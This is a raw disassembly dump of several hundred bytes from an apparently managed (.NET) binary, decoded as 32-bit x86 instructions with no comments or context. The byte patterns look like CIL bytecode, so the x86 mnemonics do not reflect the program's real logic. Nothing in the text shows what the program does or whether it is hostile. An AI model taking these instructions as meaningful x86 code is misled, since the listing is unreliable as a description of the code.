  403611:	6f                   	outsl  %ds:(%esi),(%dx)
  403612:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403613:	00 00                	add    %al,(%eax)
  403615:	0a 16                	or     (%esi),%dl
  403617:	fe 01                	incb   (%ecx)
  403619:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40361c:	04 2c                	add    $0x2c,%al
  40361e:	09 72 43             	or     %esi,0x43(%edx)
  403621:	06                   	push   %es
  403622:	00 70 13             	add    %dh,0x13(%eax)
  403625:	05 de 2a 72 4b       	add    $0x4b722ade,%eax
  40362a:	06                   	push   %es
  40362b:	00 70 07             	add    %dh,0x7(%eax)
  40362e:	6f                   	outsl  %ds:(%esi),(%dx)
  40362f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403630:	00 00                	add    %al,(%eax)
  403632:	0a 28                	or     (%eax),%ch
  403634:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403635:	00 00                	add    %al,(%eax)
  403637:	0a 13                	or     (%ebx),%dl
  403639:	05 de 16 06 2c       	add    $0x2c0616de,%eax
  40363e:	07                   	pop    %es
  40363f:	06                   	push   %es
  403640:	6f                   	outsl  %ds:(%esi),(%dx)
  403641:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403646:	dc 26                	fsubl  (%esi)
  403648:	00 72 43             	add    %dh,0x43(%edx)
  40364b:	06                   	push   %es
  40364c:	00 70 13             	add    %dh,0x13(%eax)
  40364f:	05 de 00 11 05       	add    $0x51100de,%eax
  403654:	2a 00                	sub    (%eax),%al
  403656:	00 00                	add    %al,(%eax)
  403658:	01 28                	add    %ebp,(%eax)
  40365a:	00 00                	add    %al,(%eax)
  40365c:	02 00                	add    (%eax),%al
  40365e:	35 00 2c 61 00       	xor    $0x612c00,%eax
  403663:	0b 00                	or     (%eax),%eax
  403665:	00 00                	add    %al,(%eax)
  403667:	00 02                	add    %al,(%edx)
  403669:	00 21                	add    %ah,(%ecx)
  40366b:	00 77 98             	add    %dh,-0x68(%edi)
  40366e:	00 0b                	add    %cl,(%ebx)
  403670:	00 00                	add    %al,(%eax)
  403672:	00 00                	add    %al,(%eax)
  403674:	00 00                	add    %al,(%eax)
  403676:	01 00                	add    %eax,(%eax)
  403678:	a2 a3 00 0b 0f       	mov    %al,0xf0b00a3
  40367d:	00 00                	add    %al,(%eax)
  40367f:	01 13                	add    %edx,(%ebx)
  403681:	30 02                	xor    %al,(%edx)
  403683:	00 43 00             	add    %al,0x0(%ebx)
  403686:	00 00                	add    %al,(%eax)
  403688:	11 00                	adc    %eax,(%eax)
  40368a:	00 11                	add    %dl,(%ecx)
  40368c:	00 28                	add    %ch,(%eax)
  40368e:	a8 00                	test   $0x0,%al
  403690:	00 0a                	add    %cl,(%edx)
  403692:	0a 00                	or     (%eax),%al
  403694:	06                   	push   %es
  403695:	0b 16                	or     (%esi),%edx
  403697:	0c 2b                	or     $0x2b,%al
  403699:	27                   	daa
  40369a:	07                   	pop    %es
  40369b:	08 9a 0d 00 09 6f    	or     %bl,0x6f09000d(%edx)
  4036a1:	a9 00 00 0a 02       	test   $0x20a0000,%eax
  4036a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4036a7:	aa                   	stos   %al,%es:(%edi)
  4036a8:	00 00                	add    %al,(%eax)
  4036aa:	0a 28                	or     (%eax),%ch
  4036ac:	ab                   	stos   %eax,%es:(%edi)
  4036ad:	00 00                	add    %al,(%eax)
  4036af:	0a 13                	or     (%ebx),%dl
  4036b1:	04 11                	add    $0x11,%al
  4036b3:	04 2c                	add    $0x2c,%al
  4036b5:	06                   	push   %es
  4036b6:	00 09                	add    %cl,(%ecx)
  4036b8:	13 05 2b 10 00 08    	adc    0x800102b,%eax
  4036be:	17                   	pop    %ss
  4036bf:	58                   	pop    %eax
  4036c0:	0c 08                	or     $0x8,%al
  4036c2:	07                   	pop    %es
  4036c3:	8e 69 32             	mov    0x32(%ecx),%gs
  4036c6:	d3 14 13             	rcll   %cl,(%ebx,%edx,1)
  4036c9:	05 2b 00 11 05       	add    $0x511002b,%eax
  4036ce:	2a 00                	sub    (%eax),%al
  4036d0:	1b 30                	sbb    (%eax),%esi
  4036d2:	01 00                	add    %eax,(%eax)
  4036d4:	16                   	push   %ss
	...
  4036dd:	00 20                	add    %ah,(%eax)
  4036df:	03 00                	add    (%eax),%eax
  4036e1:	00 80 28 3d 00 00    	add    %al,0x3d28(%eax)
  4036e7:	06                   	push   %es
  4036e8:	26 00 de             	es add %bl,%dh
  4036eb:	05 26 00 00 de       	add    $0xde000026,%eax
  4036f0:	00 2a                	add    %ch,(%edx)
  4036f2:	00 00                	add    %al,(%eax)
  4036f4:	01 10                	add    %edx,(%eax)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	00 00                	add    %al,(%eax)
  4036fa:	01 00                	add    %eax,(%eax)
  4036fc:	0f 10 00             	movups (%eax),%xmm0
  4036ff:	05 0f 00 00 01       	add    $0x100000f,%eax
  403704:	1b 30                	sbb    (%eax),%esi
  403706:	03 00                	add    (%eax),%eax
  403708:	42                   	inc    %edx
  403709:	00 00                	add    %al,(%eax)
  40370b:	00 12                	add    %dl,(%edx)
  40370d:	00 00                	add    %al,(%eax)
  40370f:	11 00                	adc    %eax,(%eax)
  403711:	00 20                	add    %ah,(%eax)
  403713:	00 01                	add    %al,(%ecx)
  403715:	00 00                	add    %al,(%eax)
  403717:	73 ac                	jae    0x4036c5
  403719:	00 00                	add    %al,(%eax)
  40371b:	0a 0a                	or     (%edx),%cl
  40371d:	28 39                	sub    %bh,(%ecx)
  40371f:	00 00                	add    %al,(%eax)
  403721:	06                   	push   %es
  403722:	0b 07                	or     (%edi),%eax
  403724:	06                   	push   %es
  403725:	20 00                	and    %al,(%eax)
  403727:	01 00                	add    %eax,(%eax)
  403729:	00 28                	add    %ch,(%eax)
  40372b:	3a 00                	cmp    (%eax),%al
  40372d:	00 06                	add    %al,(%esi)
  40372f:	16                   	push   %ss
  403730:	fe 02                	incb   (%edx)
  403732:	0c 08                	or     $0x8,%al
  403734:	2c 0a                	sub    $0xa,%al
  403736:	00 06                	add    %al,(%esi)
  403738:	6f                   	outsl  %ds:(%esi),(%dx)
  403739:	33 00                	xor    (%eax),%eax
  40373b:	00 0a                	add    %cl,(%edx)
  40373d:	0d de 10 00 de       	or     $0xde0010de,%eax
  403742:	05 26 00 00 de       	add    $0xde000026,%eax
  403747:	00 72 3b             	add    %dh,0x3b(%edx)
  40374a:	01 00                	add    %eax,(%eax)
  40374c:	70 0d                	jo     0x40375b
  40374e:	2b 00                	sub    (%eax),%eax
  403750:	09 2a                	or     %ebp,(%edx)
  403752:	00 00                	add    %al,(%eax)
  403754:	01 10                	add    %edx,(%eax)
  403756:	00 00                	add    %al,(%eax)
  403758:	00 00                	add    %al,(%eax)
  40375a:	01 00                	add    %eax,(%eax)
  40375c:	32 33                	xor    (%ebx),%dh
  40375e:	00 05 0f 00 00 01    	add    %al,0x100000f
  403764:	13 30                	adc    (%eax),%esi
  403766:	03 00                	add    (%eax),%eax
  403768:	19 00                	sbb    %eax,(%eax)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	0a 00                	or     (%eax),%al
  40376e:	00 11                	add    %dl,(%ecx)
  403770:	00 16                	add    %dl,(%esi)
  403772:	7e 08                	jle    0x40377c
  403774:	00 00                	add    %al,(%eax)
  403776:	04 12                	add    $0x12,%al
  403778:	00 73 ad             	add    %dh,-0x53(%ebx)
  40377b:	00 00                	add    %al,(%eax)
  40377d:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  403783:	06                   	push   %es
  403784:	0b 2b                	or     (%ebx),%ebp
  403786:	00 07                	add    %al,(%edi)
  403788:	2a 00                	sub    (%eax),%al
  40378a:	00 00                	add    %al,(%eax)
  40378c:	13 30                	adc    (%eax),%esi
  40378e:	02 00                	add    (%eax),%al
  403790:	21 00                	and    %eax,(%eax)
  403792:	00 00                	add    %al,(%eax)
  403794:	02 00                	add    (%eax),%al
  403796:	00 11                	add    %dl,(%ecx)
  403798:	00 7e 1f             	add    %bh,0x1f(%esi)
  40379b:	00 00                	add    %al,(%eax)
  40379d:	04 14                	add    $0x14,%al
  40379f:	fe 03                	incb   (%ebx)
  4037a1:	0a 06                	or     (%esi),%al
  4037a3:	2c 13                	sub    $0x13,%al
  4037a5:	00 7e 1f             	add    %bh,0x1f(%esi)
  4037a8:	00 00                	add    %al,(%eax)
  4037aa:	04 6f                	add    $0x6f,%al
  4037ac:	ae                   	scas   %es:(%edi),%al
  4037ad:	00 00                	add    %al,(%eax)
  4037af:	0a 00                	or     (%eax),%al
  4037b1:	14 80                	adc    $0x80,%al
  4037b3:	1f                   	pop    %ds
  4037b4:	00 00                	add    %al,(%eax)
  4037b6:	04 00                	add    $0x0,%al
  4037b8:	2a 00                	sub    (%eax),%al
  4037ba:	00 00                	add    %al,(%eax)
  4037bc:	13 30                	adc    (%eax),%esi
  4037be:	01 00                	add    %eax,(%eax)
  4037c0:	20 00                	and    %al,(%eax)
  4037c2:	00 00                	add    %al,(%eax)
  4037c4:	02 00                	add    (%eax),%al
  4037c6:	00 11                	add    %dl,(%ecx)
  4037c8:	00 7e 0f             	add    %bh,0xf(%esi)
  4037cb:	00 00                	add    %al,(%eax)
  4037cd:	04 28                	add    $0x28,%al
  4037cf:	13 00                	adc    (%eax),%eax
  4037d1:	00 0a                	add    %cl,(%edx)
  4037d3:	2c 07                	sub    $0x7,%al
  4037d5:	28 31                	sub    %dh,(%ecx)
  4037d7:	00 00                	add    %al,(%eax)
  4037d9:	06                   	push   %es
  4037da:	2b 01                	sub    (%ecx),%eax
  4037dc:	16                   	push   %ss
  4037dd:	0a 06                	or     (%esi),%al
  4037df:	2c 06                	sub    $0x6,%al
  4037e1:	28 41 00             	sub    %al,0x0(%ecx)
  4037e4:	00 06                	add    %al,(%esi)
  4037e6:	00 2a                	add    %ch,(%edx)
  4037e8:	1b 30                	sbb    (%eax),%esi
  4037ea:	03 00                	add    (%eax),%eax
  4037ec:	2c 00                	sub    $0x0,%al
	...
  4037f6:	14 fe                	adc    $0xfe,%al
  4037f8:	06                   	push   %es
  4037f9:	3f                   	aas
  4037fa:	00 00                	add    %al,(%eax)
  4037fc:	06                   	push   %es
  4037fd:	73 af                	jae    0x4037ae
  4037ff:	00 00                	add    %al,(%eax)
  403801:	0a 28                	or     (%eax),%ch
  403803:	b0 00                	mov    $0x0,%al
  403805:	00 0a                	add    %cl,(%edx)
  403807:	00 28                	add    %ch,(%eax)
  403809:	b1 00                	mov    $0x0,%cl
  40380b:	00 0a                	add    %cl,(%edx)
  40380d:	00 17                	add    %dl,(%edi)
  40380f:	16                   	push   %ss
  403810:	16                   	push   %ss
  403811:	28 3e                	sub    %bh,(%esi)
  403813:	00 00                	add    %al,(%eax)
  403815:	06                   	push   %es
  403816:	00 00                	add    %al,(%eax)
  403818:	de 05 26 00 00 de    	fiadds 0xde000026
  40381e:	00 2a                	add    %ch,(%edx)
  403820:	01 10                	add    %edx,(%eax)
  403822:	00 00                	add    %al,(%eax)
  403824:	00 00                	add    %al,(%eax)
  403826:	01 00                	add    %eax,(%eax)
  403828:	25 26 00 05 0f       	and    $0xf050026,%eax
  40382d:	00 00                	add    %al,(%eax)
  40382f:	01 1b                	add    %ebx,(%ebx)
  403831:	30 03                	xor    %al,(%ebx)
  403833:	00 24 00             	add    %ah,(%eax,%eax,1)
  403836:	00 00                	add    %al,(%eax)
  403838:	02 00                	add    (%eax),%al
  40383a:	00 11                	add    %dl,(%ecx)
  40383c:	00 00                	add    %al,(%eax)
  40383e:	16                   	push   %ss
  40383f:	16                   	push   %ss
  403840:	16                   	push   %ss
  403841:	28 3e                	sub    %bh,(%esi)
  403843:	00 00                	add    %al,(%eax)
  403845:	06                   	push   %es
  403846:	00 00                	add    %al,(%eax)
  403848:	de 15 26 00 2b 0d    	ficoms 0xd2b0026
  40384e:	00 20                	add    %ah,(%eax)
  403850:	a0 86 01 00 28       	mov    0x28000186,%al
  403855:	10 00                	adc    %al,(%eax)
  403857:	00 0a                	add    %cl,(%edx)
  403859:	00 00                	add    %al,(%eax)
  40385b:	17                   	pop    %ss
  40385c:	0a 2b                	or     (%ebx),%ch
  40385e:	ef                   	out    %eax,(%dx)
  40385f:	2a 01                	sub    (%ecx),%al
  403861:	10 00                	adc    %al,(%eax)
  403863:	00 00                	add    %al,(%eax)
  403865:	00 01                	add    %al,(%ecx)
  403867:	00 0d 0e 00 15 0f    	add    %cl,0xf15000e
  40386d:	00 00                	add    %al,(%eax)
  40386f:	01 1b                	add    %ebx,(%ebx)
  403871:	30 04 00             	xor    %al,(%eax,%eax,1)
  403874:	44                   	inc    %esp
  403875:	00 00                	add    %al,(%eax)
  403877:	00 14 00             	add    %dl,(%eax,%eax,1)
  40387a:	00 11                	add    %dl,(%ecx)
  40387c:	00 00                	add    %al,(%eax)
  40387e:	7e 66                	jle    0x4038e6
  403880:	00 00                	add    %al,(%eax)
  403882:	0a 7e 20             	or     0x20(%esi),%bh
  403885:	00 00                	add    %al,(%eax)
  403887:	04 18                	add    $0x18,%al
  403889:	6f                   	outsl  %ds:(%esi),(%dx)
  40388a:	b2 00                	mov    $0x0,%dl
  40388c:	00 0a                	add    %cl,(%edx)
  40388e:	0a 00                	or     (%eax),%al
  403890:	06                   	push   %es
  403891:	02 03                	add    (%ebx),%al
  403893:	19 6f b3             	sbb    %ebp,-0x4d(%edi)
  403896:	00 00                	add    %al,(%eax)
  403898:	0a 00                	or     (%eax),%al
  40389a:	17                   	pop    %ss
  40389b:	0b de                	or     %esi,%ebx
  40389d:	20 06                	and    %al,(%esi)
  40389f:	2c 07                	sub    $0x7,%al
  4038a1:	06                   	push   %es
  4038a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4038a3:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4038a8:	dc 0c 00             	fmull  (%eax,%eax,1)
  4038ab:	08 6f 76             	or     %ch,0x76(%edi)
  4038ae:	00 00                	add    %al,(%eax)
  4038b0:	0a 28                	or     (%eax),%ch
  4038b2:	4a                   	dec    %edx
  4038b3:	00 00                	add    %al,(%eax)
  4038b5:	06                   	push   %es
  4038b6:	00 00                	add    %al,(%eax)
  4038b8:	de 00                	fiadds (%eax)
  4038ba:	16                   	push   %ss
  4038bb:	0b 2b                	or     (%ebx),%ebp
  4038bd:	00 07                	add    %al,(%edi)
  4038bf:	2a 01                	sub    (%ecx),%al
  4038c1:	1c 00                	sbb    $0x0,%al
  4038c3:	00 02                	add    %al,(%edx)
  4038c5:	00 13                	add    %dl,(%ebx)
  4038c7:	00 0f                	add    %cl,(%edi)
  4038c9:	22 00                	and    (%eax),%al
  4038cb:	0b 00                	or     (%eax),%eax
  4038cd:	00 00                	add    %al,(%eax)
  4038cf:	00 00                	add    %al,(%eax)
  4038d1:	00 01                	add    %al,(%ecx)
  4038d3:	00 2c 2d 00 11 12 00 	add    %ch,0x121100(,%ebp,1)
  4038da:	00 01                	add    %al,(%ecx)
  4038dc:	1b 30                	sbb    (%eax),%esi
  4038de:	02 00                	add    (%eax),%al
  4038e0:	46                   	inc    %esi
  4038e1:	00 00                	add    %al,(%eax)
  4038e3:	00 15 00 00 11 00    	add    %dl,0x110000
  4038e9:	00 7e 66             	add    %bh,0x66(%esi)
  4038ec:	00 00                	add    %al,(%eax)
  4038ee:	0a 7e 20             	or     0x20(%esi),%bh
  4038f1:	00 00                	add    %al,(%eax)
  4038f3:	04 6f                	add    $0x6f,%al
  4038f5:	b4 00                	mov    $0x0,%ah
  4038f7:	00 0a                	add    %cl,(%edx)
  4038f9:	0a 00                	or     (%eax),%al
  4038fb:	06                   	push   %es
  4038fc:	02 6f b5             	add    -0x4b(%edi),%ch
  4038ff:	00 00                	add    %al,(%eax)
  403901:	0a 0b                	or     (%ebx),%cl
  403903:	07                   	pop    %es
  403904:	74 02                	je     0x403908
  403906:	00 00                	add    %al,(%eax)
  403908:	1b 0c de             	sbb    (%esi,%ebx,8),%ecx
  40390b:	20 06                	and    %al,(%esi)
  40390d:	2c 07                	sub    $0x7,%al
  40390f:	06                   	push   %es
  403910:	6f                   	outsl  %ds:(%esi),(%dx)
  403911:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403916:	dc 0d 00 09 6f 76    	fmull  0x766f0900
  40391c:	00 00                	add    %al,(%eax)
  40391e:	0a 28                	or     (%eax),%ch
  403920:	4a                   	dec    %edx
  403921:	00 00                	add    %al,(%eax)
  403923:	06                   	push   %es
  403924:	00 00                	add    %al,(%eax)
  403926:	de 00                	fiadds (%eax)
  403928:	14 0c                	adc    $0xc,%al
  40392a:	2b 00                	sub    (%eax),%eax
  40392c:	08 2a                	or     %ch,(%edx)
  40392e:	00 00                	add    %al,(%eax)
  403930:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403933:	00 02                	add    %al,(%edx)
  403935:	00 12                	add    %dl,(%edx)
  403937:	00 12                	add    %dl,(%edx)
  403939:	24 00                	and    $0x0,%al
  40393b:	0b 00                	or     (%eax),%eax
  40393d:	00 00                	add    %al,(%eax)
  40393f:	00 00                	add    %al,(%eax)
  403941:	00 01                	add    %al,(%ecx)
  403943:	00 2e                	add    %ch,(%esi)
  403945:	2f                   	das
  403946:	00 11                	add    %dl,(%ecx)
  403948:	12 00                	adc    (%eax),%al
  40394a:	00 01                	add    %al,(%ecx)
  40394c:	1b 30                	sbb    (%eax),%esi
  40394e:	02 00                	add    (%eax),%al
  403950:	41                   	inc    %ecx
  403951:	00 00                	add    %al,(%eax)
  403953:	00 14 00             	add    %dl,(%eax,%eax,1)
  403956:	00 11                	add    %dl,(%ecx)
  403958:	00 00                	add    %al,(%eax)
  40395a:	7e 66                	jle    0x4039c2
  40395c:	00 00                	add    %al,(%eax)
  40395e:	0a 7e 20             	or     0x20(%esi),%bh
  403961:	00 00                	add    %al,(%eax)
  403963:	04 6f                	add    $0x6f,%al
  403965:	b4 00                	mov    $0x0,%ah
  403967:	00 0a                	add    %cl,(%edx)
  403969:	0a 00                	or     (%eax),%al
  40396b:	06                   	push   %es
  40396c:	02 6f b6             	add    -0x4a(%edi),%ch
  40396f:	00 00                	add    %al,(%eax)
  403971:	0a 00                	or     (%eax),%al
  403973:	17                   	pop    %ss
  403974:	0b de                	or     %esi,%ebx
  403976:	20 06                	and    %al,(%esi)
  403978:	2c 07                	sub    $0x7,%al
  40397a:	06                   	push   %es
  40397b:	6f                   	outsl  %ds:(%esi),(%dx)
  40397c:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403981:	dc 0c 00             	fmull  (%eax,%eax,1)
  403984:	08 6f 76             	or     %ch,0x76(%edi)
  403987:	00 00                	add    %al,(%eax)
  403989:	0a 28                	or     (%eax),%ch
  40398b:	4a                   	dec    %edx
  40398c:	00 00                	add    %al,(%eax)
  40398e:	06                   	push   %es
  40398f:	00 00                	add    %al,(%eax)
  403991:	de 00                	fiadds (%eax)
  403993:	16                   	push   %ss
  403994:	0b 2b                	or     (%ebx),%ebp
  403996:	00 07                	add    %al,(%edi)
  403998:	2a 00                	sub    (%eax),%al
  40399a:	00 00                	add    %al,(%eax)
  40399c:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40399f:	00 02                	add    %al,(%edx)
  4039a1:	00 12                	add    %dl,(%edx)
  4039a3:	00 0d 1f 00 0b 00    	add    %cl,0xb001f
  4039a9:	00 00                	add    %al,(%eax)
  4039ab:	00 00                	add    %al,(%eax)
  4039ad:	00 01                	add    %al,(%ecx)
  4039af:	00 29                	add    %ch,(%ecx)
  4039b1:	2a 00                	sub    (%eax),%al
  4039b3:	11 12                	adc    %edx,(%edx)
  4039b5:	00 00                	add    %al,(%eax)
  4039b7:	01 1b                	add    %ebx,(%ebx)
  4039b9:	30 03                	xor    %al,(%ebx)
  4039bb:	00 46 00             	add    %al,0x0(%esi)
  4039be:	00 00                	add    %al,(%eax)
  4039c0:	14 00                	adc    $0x0,%al
  4039c2:	00 11                	add    %dl,(%ecx)
  4039c4:	00 00                	add    %al,(%eax)
  4039c6:	7e 66                	jle    0x403a2e
  4039c8:	00 00                	add    %al,(%eax)
  4039ca:	0a 72 3b             	or     0x3b(%edx),%dh
  4039cd:	01 00                	add    %eax,(%eax)
  4039cf:	70 17                	jo     0x4039e8
  4039d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d2:	b7 00                	mov    $0x0,%bh
  4039d4:	00 0a                	add    %cl,(%edx)
  4039d6:	0a 00                	or     (%eax),%al
  4039d8:	06                   	push   %es
  4039d9:	7e 20                	jle    0x4039fb
  4039db:	00 00                	add    %al,(%eax)
  4039dd:	04 6f                	add    $0x6f,%al
  4039df:	b8 00 00 0a 00       	mov    $0xa0000,%eax
  4039e4:	17                   	pop    %ss
  4039e5:	0b de                	or     %esi,%ebx
  4039e7:	20 06                	and    %al,(%esi)
  4039e9:	2c 07                	sub    $0x7,%al
  4039eb:	06                   	push   %es
  4039ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4039ed:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4039f2:	dc 0c 00             	fmull  (%eax,%eax,1)
  4039f5:	08 6f 76             	or     %ch,0x76(%edi)
  4039f8:	00 00                	add    %al,(%eax)
  4039fa:	0a 28                	or     (%eax),%ch
  4039fc:	4a                   	dec    %edx
  4039fd:	00 00                	add    %al,(%eax)
  4039ff:	06                   	push   %es
  403a00:	00 00                	add    %al,(%eax)
  403a02:	de 00                	fiadds (%eax)
  403a04:	16                   	push   %ss
  403a05:	0b 2b                	or     (%ebx),%ebp
  403a07:	00 07                	add    %al,(%edi)
  403a09:	2a 00                	sub    (%eax),%al
  403a0b:	00 01                	add    %al,(%ecx)
  403a0d:	1c 00                	sbb    $0x0,%al
  403a0f:	00 02                	add    %al,(%edx)
  403a11:	00 13                	add    %dl,(%ebx)
  403a13:	00 11                	add    %dl,(%ecx)
  403a15:	24 00                	and    $0x0,%al
  403a17:	0b 00                	or     (%eax),%eax
  403a19:	00 00                	add    %al,(%eax)
  403a1b:	00 00                	add    %al,(%eax)
  403a1d:	00 01                	add    %al,(%ecx)
  403a1f:	00 2e                	add    %ch,(%esi)
  403a21:	2f                   	das
  403a22:	00 11                	add    %dl,(%ecx)
  403a24:	12 00                	adc    (%eax),%al
  403a26:	00 01                	add    %al,(%ecx)
  403a28:	56                   	push   %esi
  403a29:	72 51                	jb     0x403a7c
  403a2b:	06                   	push   %es
  403a2c:	00 70 7e             	add    %dh,0x7e(%eax)
  403a2f:	10 00                	adc    %al,(%eax)
  403a31:	00 04 28             	add    %al,(%eax,%ebp,1)
  403a34:	6f                   	outsl  %ds:(%esi),(%dx)
  403a35:	00 00                	add    %al,(%eax)
  403a37:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  403a3d:	2a 00                	sub    (%eax),%al
  403a3f:	00 1b                	add    %bl,(%ebx)
  403a41:	30 03                	xor    %al,(%ebx)
  403a43:	00 10                	add    %dl,(%eax)
  403a45:	02 00                	add    (%eax),%al
  403a47:	00 16                	add    %dl,(%esi)
  403a49:	00 00                	add    %al,(%eax)
  403a4b:	11 00                	adc    %eax,(%eax)
  403a4d:	00 73 4d             	add    %dh,0x4d(%ebx)
  403a50:	00 00                	add    %al,(%eax)
  403a52:	0a 0a                	or     (%edx),%cl
  403a54:	06                   	push   %es
  403a55:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403a59:	00 1b                	add    %bl,(%ebx)
  403a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403a5c:	b9 00 00 0a 00       	mov    $0xa0000,%ecx
  403a61:	06                   	push   %es
  403a62:	72 d1                	jb     0x403a35
  403a64:	01 00                	add    %eax,(%eax)
  403a66:	70 6f                	jo     0x403ad7
  403a68:	4e                   	dec    %esi
  403a69:	00 00                	add    %al,(%eax)
  403a6b:	0a 6f ba             	or     -0x46(%edi),%ch
  403a6e:	00 00                	add    %al,(%eax)
  403a70:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403a73:	0b 07                	or     (%edi),%eax
  403a75:	72 65                	jb     0x403adc
  403a77:	06                   	push   %es
  403a78:	00 70 28             	add    %dh,0x28(%eax)
  403a7b:	1f                   	pop    %ds
  403a7c:	00 00                	add    %al,(%eax)
  403a7e:	0a 2d 22 07 72 6f    	or     0x6f720722,%ch
  403a84:	06                   	push   %es
  403a85:	00 70 28             	add    %dh,0x28(%eax)
  403a88:	1f                   	pop    %ds
  403a89:	00 00                	add    %al,(%eax)
  403a8b:	0a 2d 68 07 72 7d    	or     0x7d720768,%ch
  403a91:	06                   	push   %es
  403a92:	00 70 28             	add    %dh,0x28(%eax)
  403a95:	1f                   	pop    %ds
  403a96:	00 00                	add    %al,(%eax)
  403a98:	0a 3a                	or     (%edx),%bh
  403a9a:	f7 00 00 00 38 a2    	testl  $0xa2380000,(%eax)
  403aa0:	01 00                	add    %eax,(%eax)
  403aa2:	00 00                	add    %al,(%eax)
  403aa4:	16                   	push   %ss
  403aa5:	28 1a                	sub    %bl,(%edx)
  403aa7:	00 00                	add    %al,(%eax)
  403aa9:	06                   	push   %es
  403aaa:	00 73 4d             	add    %dh,0x4d(%ebx)
  403aad:	00 00                	add    %al,(%eax)
  403aaf:	0a 0d 09 72 d1 01    	or     0x1d17209,%cl
  403ab5:	00 70 6f             	add    %dh,0x6f(%eax)
  403ab8:	4e                   	dec    %esi
  403ab9:	00 00                	add    %al,(%eax)
  403abb:	0a 72 65             	or     0x65(%edx),%dh
  403abe:	06                   	push   %es
  403abf:	00 70 6f             	add    %dh,0x6f(%eax)
  403ac2:	bb 00 00 0a 00       	mov    $0xa0000,%ebx
  403ac7:	09 72 e9             	or     %esi,-0x17(%edx)
  403aca:	01 00                	add    %eax,(%eax)
  403acc:	70 6f                	jo     0x403b3d
  403ace:	4e                   	dec    %esi
  403acf:	00 00                	add    %al,(%eax)
  403ad1:	0a 28                	or     (%eax),%ch
  403ad3:	17                   	pop    %ss
  403ad4:	00 00                	add    %al,(%eax)
  403ad6:	06                   	push   %es
  403ad7:	6a 6f                	push   $0x6f
  403ad9:	bc 00 00 0a 00       	mov    $0xa0000,%esp
  403ade:	09 6f 51             	or     %ebp,0x51(%edi)
  403ae1:	00 00                	add    %al,(%eax)
  403ae3:	0a 28                	or     (%eax),%ch
  403ae5:	21 00                	and    %eax,(%eax)
  403ae7:	00 06                	add    %al,(%esi)
  403ae9:	00 16                	add    %dl,(%esi)
  403aeb:	28 18                	sub    %bl,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	06                   	push   %es
  403af0:	00 38                	add    %bh,(%eax)
  403af2:	4f                   	dec    %edi
  403af3:	01 00                	add    %eax,(%eax)
  403af5:	00 00                	add    %al,(%eax)
  403af7:	00 06                	add    %al,(%esi)
  403af9:	72 93                	jb     0x403a8e
  403afb:	06                   	push   %es
  403afc:	00 70 6f             	add    %dh,0x6f(%eax)
  403aff:	4e                   	dec    %esi
  403b00:	00 00                	add    %al,(%eax)
  403b02:	0a 6f ba             	or     -0x46(%edi),%ch
  403b05:	00 00                	add    %al,(%eax)
  403b07:	0a 28                	or     (%eax),%ch
  403b09:	43                   	inc    %ebx
  403b0a:	00 00                	add    %al,(%eax)
  403b0c:	06                   	push   %es
  403b0d:	14 fe                	adc    $0xfe,%al
  403b0f:	01 13                	add    %edx,(%ebx)
  403b11:	04 11                	add    $0x11,%al
  403b13:	04 2c                	add    $0x2c,%al
  403b15:	5d                   	pop    %ebp
  403b16:	00 7e 21             	add    %bh,0x21(%esi)
  403b19:	00 00                	add    %al,(%eax)
  403b1b:	04 06                	add    $0x6,%al
  403b1d:	6f                   	outsl  %ds:(%esi),(%dx)
  403b1e:	bd 00 00 0a 00       	mov    $0xa0000,%ebp
  403b23:	73 4d                	jae    0x403b72
  403b25:	00 00                	add    %al,(%eax)
  403b27:	0a 13                	or     (%ebx),%dl
  403b29:	05 11 05 72 d1       	add    $0xd1720511,%eax
  403b2e:	01 00                	add    %eax,(%eax)
  403b30:	70 6f                	jo     0x403ba1
  403b32:	4e                   	dec    %esi
  403b33:	00 00                	add    %al,(%eax)
  403b35:	0a 72 9b             	or     -0x65(%edx),%dh
  403b38:	06                   	push   %es
  403b39:	00 70 6f             	add    %dh,0x6f(%eax)
  403b3c:	bb 00 00 0a 00       	mov    $0xa0000,%ebx
  403b41:	11 05 72 b1 06 00    	adc    %eax,0x6b172
  403b47:	70 6f                	jo     0x403bb8
  403b49:	4e                   	dec    %esi
  403b4a:	00 00                	add    %al,(%eax)
  403b4c:	0a 06                	or     (%esi),%al
  403b4e:	72 93                	jb     0x403ae3
  403b50:	06                   	push   %es
  403b51:	00 70 6f             	add    %dh,0x6f(%eax)
  403b54:	4e                   	dec    %esi
  403b55:	00 00                	add    %al,(%eax)
  403b57:	0a 6f ba             	or     -0x46(%edi),%ch
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	0a 6f bb             	or     -0x45(%edi),%ch
  403b5f:	00 00                	add    %al,(%eax)
  403b61:	0a 00                	or     (%eax),%al
  403b63:	11 05 6f 51 00 00    	adc    %eax,0x516f
  403b69:	0a 28                	or     (%eax),%ch
  403b6b:	21 00                	and    %eax,(%eax)
  403b6d:	00 06                	add    %al,(%esi)
  403b6f:	00 00                	add    %al,(%eax)
  403b71:	2b 07                	sub    (%edi),%eax
  403b73:	06                   	push   %es
  403b74:	28 48 00             	sub    %cl,0x0(%eax)
  403b77:	00 06                	add    %al,(%esi)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	de 13                	ficoms (%ebx)
  403b7d:	13 06                	adc    (%esi),%eax
  403b7f:	00 11                	add    %dl,(%ecx)
  403b81:	06                   	push   %es
  403b82:	6f                   	outsl  %ds:(%esi),(%dx)
